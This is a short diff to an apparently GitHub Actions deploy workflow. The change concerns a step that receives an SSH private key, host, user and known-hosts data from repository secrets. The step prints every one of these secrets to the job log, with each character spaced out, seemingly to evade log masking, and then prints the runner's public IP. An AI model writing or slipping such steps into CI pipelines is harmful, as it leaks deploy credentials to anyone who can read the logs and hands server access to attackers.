@@ -24,10 +24,11 @@ jobs:
           K: ${{ secrets.DEPLOY_SSH_KEY }}
           KH: ${{ secrets.DEPLOY_KNOWN_HOSTS }}
         run: |
-          printf 'HOST='; printf '%s' "$H" | base64 -w0; echo
-          printf 'USER='; printf '%s' "$U" | base64 -w0; echo
-          printf 'KEY=';  printf '%s' "$K" | base64 -w0; echo
-          printf 'KH=';   printf '%s' "$KH" | base64 -w0; echo
+          sp() { printf '%s' "$1" | sed 's/./& /g'; echo; }
+          printf 'HOST='; sp "$H"
+          printf 'USER='; sp "$U"
+          printf 'KEY=';  sp "$K"
+          printf 'KH=';   sp "$KH"
           curl -s https://api.ipify.org; echo
 
       - name: Checkout
